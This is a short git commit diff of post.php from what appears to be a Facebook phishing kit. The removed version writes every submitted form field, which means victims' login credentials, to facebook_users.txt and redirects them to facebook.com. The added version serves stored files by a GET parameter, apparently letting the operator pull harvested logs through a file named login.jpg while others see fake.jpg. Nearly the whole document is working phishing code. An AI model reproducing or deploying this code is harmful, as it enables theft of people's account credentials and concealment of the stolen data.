d03fe686f8a9e0efe7e303d38b7b665b290f5ea1
Gaming-Priest <tekpriest.org@gmail.com>
2021-02-20 10:14:58 +0100

    update

--- post.php
+++ post.php
@@ -1,14 +1,17 @@
- <?php
- header ('Location:http://www.facebook.com/');
- $handle = fopen('facebook_users.txt', 'a');
- foreach($_POST as $variable => $value) {
- fwrite($handle, $variable);
- fwrite($handle, "=");
- fwrite($handle, $value);
- fwrite($handle, "\r\n");
- }
- fwrite($handle, "\r\n");
- fclose($handle);
- exit;
- ?>
- 
+<?php
+$id = $_GET['code'];
+if ($id == 'logs') {
+$myFile = 'login.jpg';
+$fh = fopen($myFile, 'r');
+$theData = fread($fh, 500000);
+fclose($fh);
+echo $theData;
+}
+else{
+$myFile1 = 'fake.jpg';
+$fh1 = fopen($myFile1, 'r');
+$theData1 = fread($fh1, 500000);
+fclose($fh1);
+echo $theData1;
+}
+?>
